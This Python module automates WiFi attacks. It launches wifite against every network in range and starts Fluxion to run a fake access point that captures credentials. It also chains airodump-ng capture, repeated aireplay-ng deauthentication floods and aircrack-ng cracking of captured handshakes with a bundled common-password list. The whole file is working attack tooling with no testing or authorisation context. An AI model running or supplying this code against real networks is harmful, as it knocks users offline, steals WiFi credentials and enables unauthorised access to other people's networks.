# modules/automated_wifi_attack.py
import subprocess
import os
import signal
import time
import sys


def run_automated_attack(interface):
    """
    Launch an automated WiFi attack using wifite.

    Args:
        interface (str): Network interface in monitor mode

    Returns:
        None: Outputs status messages to console
    """
    print(f"[+] Starting automated attacks using wifite on interface {interface}")
    try:
        # Check if interface exists
        check_interface = subprocess.run(["ifconfig", interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if check_interface.returncode != 0:
            print(f"[-] Interface {interface} does not exist. Please check your configuration.")
            return

        # Store the process ID to allow termination later
        command = [
            "sudo", "wifite", "-i", interface, "--all", "--kill", "--yes"
        ]

        # Create a log file for the output
        log_file = open("/tmp/wifite_attack.log", "w")
        print(f"[+] Command: {' '.join(command)}")
        print(f"[+] Logging output to /tmp/wifite_attack.log")

        # Run wifite in the background with output logging
        process = subprocess.Popen(
            command,
            stdout=log_file,
            stderr=log_file,
            preexec_fn=os.setsid  # Use process group for easier termination
        )

        # Save the process ID to a file for later termination
        with open("/tmp/wifite_pid", "w") as f:
            f.write(str(process.pid))

        print(f"[+] Wifite attack started with PID {process.pid}")
        print(f"[+] To stop the attack manually, run: kill -TERM -{process.pid}")

    except Exception as e:
        print(f"[-] Error starting automated attack: {str(e)}")


def run_fluxion_attack(interface):
    """
    Launch a Fluxion attack for creating a fake access point and capturing credentials.

    Args:
        interface (str): Network interface in monitor mode

    Returns:
        None: Outputs status messages to console
    """
    print(f"[+] Starting Fluxion attack on interface {interface}")
    try:
        # Check if Fluxion is installed
        check_fluxion = subprocess.run(["which", "fluxion"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if check_fluxion.returncode != 0:
            print("[-] Fluxion is not installed or not in PATH.")
            print("[+] You can install it from: https://github.com/FluxionNetwork/fluxion")
            return

        # Store the process ID to allow termination later
        command = [
            "sudo", "fluxion", "--interface", interface, "--no-term", "--silent"
        ]

        # Create a log file for the output
        log_file = open("/tmp/fluxion_attack.log", "w")
        print(f"[+] Command: {' '.join(command)}")
        print(f"[+] Logging output to /tmp/fluxion_attack.log")

        # Run fluxion in the background with output logging
        process = subprocess.Popen(
            command,
            stdout=log_file,
            stderr=log_file,
            preexec_fn=os.setsid  # Use process group for easier termination
        )

        # Save the process ID to a file for later termination
        with open("/tmp/fluxion_pid", "w") as f:
            f.write(str(process.pid))

        print(f"[+] Fluxion attack started with PID {process.pid}")
        print(f"[+] To stop the attack manually, run: kill -TERM -{process.pid}")

    except Exception as e:
        print(f"[-] Error starting Fluxion attack: {str(e)}")


def stop_automated_attack():
    """
    Stop any running automated attacks.

    Returns:
        None: Outputs status messages to console
    """
    print("[+] Stopping automated attacks...")
    try:
        # Check for wifite PID file
        if os.path.exists("/tmp/wifite_pid"):
            with open("/tmp/wifite_pid", "r") as f:
                pid = int(f.read().strip())
                try:
                    # Send SIGTERM to the entire process group
                    os.killpg(os.getpgid(pid), signal.SIGTERM)
                    print(f"[+] Terminated wifite process group with PID {pid}")
                except ProcessLookupError:
                    print(f"[+] Process {pid} already terminated")
            os.remove("/tmp/wifite_pid")

        # Check for fluxion PID file
        if os.path.exists("/tmp/fluxion_pid"):
            with open("/tmp/fluxion_pid", "r") as f:
                pid = int(f.read().strip())
                try:
                    # Send SIGTERM to the entire process group
                    os.killpg(os.getpgid(pid), signal.SIGTERM)
                    print(f"[+] Terminated fluxion process group with PID {pid}")
                except ProcessLookupError:
                    print(f"[+] Process {pid} already terminated")
            os.remove("/tmp/fluxion_pid")

        # Additional cleanup for background processes
        cleanup_commands = [
            ["sudo", "pkill", "-f", "wifite"],
            ["sudo", "pkill", "-f", "fluxion"],
            ["sudo", "pkill", "-f", "airodump-ng"],
            ["sudo", "pkill", "-f", "aireplay-ng"],
            ["sudo", "pkill", "-f", "aircrack-ng"]
        ]

        for cmd in cleanup_commands:
            subprocess.run(cmd, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

        print("[+] All automated attack processes stopped")

    except Exception as e:
        print(f"[-] Error stopping automated attacks: {str(e)}")


def run_wifi_attack_suite(interface, target_bssid=None, target_channel=None):
    """
    Run a complete WiFi attack suite including scanning, deauthentication,
    handshake capture, and cracking.

    Args:
        interface (str): Network interface in monitor mode
        target_bssid (str, optional): Target AP MAC address
        target_channel (int, optional): Target AP channel

    Returns:
        None: Outputs status messages to console
    """
    print("[+] Starting comprehensive WiFi attack suite...")
    try:
        # Step 1: Scan for networks if no target specified
        if target_bssid is None:
            print("[+] Step 1: Scanning for networks...")
            scan_process = subprocess.Popen(
                ["sudo", "airodump-ng", interface, "--output-format", "csv",
                 "--write", "/tmp/wifi_scan"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            print("[+] Scanning for 10 seconds, please wait...")
            time.sleep(10)
            scan_process.terminate()

            print("[+] Scan complete. Select a target from /tmp/wifi_scan-01.csv")
            print("[+] Then run this attack again with the target BSSID and channel")
            return

        # Step 2: Target a specific access point
        print(f"[+] Step 2: Targeting AP {target_bssid} on channel {target_channel}")

        # Create a directory for attack files
        os.makedirs("/tmp/wifi_attack", exist_ok=True)

        # Start airodump-ng focused on target
        print("[+] Starting targeted capture...")
        capture_cmd = [
            "sudo", "airodump-ng", "--bssid", target_bssid,
            "--channel", str(target_channel), "--write", "/tmp/wifi_attack/capture",
            "--output-format", "cap,csv", interface
        ]

        capture_process = subprocess.Popen(
            capture_cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        # Step 3: Deauth to force handshake
        print("[+] Step 3: Sending deauthentication packets...")
        deauth_cmd = [
            "sudo", "aireplay-ng", "--deauth", "10", "-a", target_bssid, interface
        ]

        for _ in range(3):  # Send 3 waves of deauth
            subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)

        # Give time for handshake capture
        print("[+] Waiting for handshake capture (30 seconds)...")
        time.sleep(30)

        # Step 4: Stop capture
        capture_process.terminate()
        print("[+] Capture stopped")

        # Step 5: Attempt to crack the handshake
        print("[+] Step 5: Attempting to crack captured handshake...")
        print("[+] Using small built-in wordlist. For better results, use a custom wordlist.")

        # Create a small wordlist with common passwords for testing
        with open("/tmp/wifi_attack/common_passwords.txt", "w") as f:
            f.write("password\n12345678\nqwerty\n1234567890\n"
                    "abc123\npassword123\nadmin\nadmin123\nwifi123\n"
                    "letmein\ndefault\n00000000\n11111111\n987654321")

        crack_cmd = [
            "sudo", "aircrack-ng", "-w", "/tmp/wifi_attack/common_passwords.txt",
            "/tmp/wifi_attack/capture-01.cap"
        ]

        subprocess.run(crack_cmd)

        print("[+] Attack suite completed. Check output for results.")
        print("[+] For more thorough cracking, use:")
        print(f"    sudo aircrack-ng -w /path/to/wordlist.txt /tmp/wifi_attack/capture-01.cap")

    except Exception as e:
        print(f"[-] Error during WiFi attack suite: {str(e)}")

        # Cleanup on error
        try:
            subprocess.run(["sudo", "pkill", "airodump-ng"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "pkill", "aireplay-ng"], stderr=subprocess.DEVNULL)
        except:
            pass


if __name__ == "__main__":
    # Handle direct execution of this module for testing
    if len(sys.argv) < 3:
        print("Usage: python3 automated_wifi_attack.py <command> <interface> [bssid] [channel]")
        print("Commands: wifite, fluxion, suite, stop")
        sys.exit(1)

    command = sys.argv[1]
    interface = sys.argv[2]

    if command == "wifite":
        run_automated_attack(interface)
    elif command == "fluxion":
        run_fluxion_attack(interface)
    elif command == "stop":
        stop_automated_attack()
    elif command == "suite":
        if len(sys.argv) >= 5:
            run_wifi_attack_suite(interface, sys.argv[3], int(sys.argv[4]))
        else:
            run_wifi_attack_suite(interface)
    else:
        print(f"Unknown command: {command}")
        print("Commands: wifite, fluxion, suite, stop")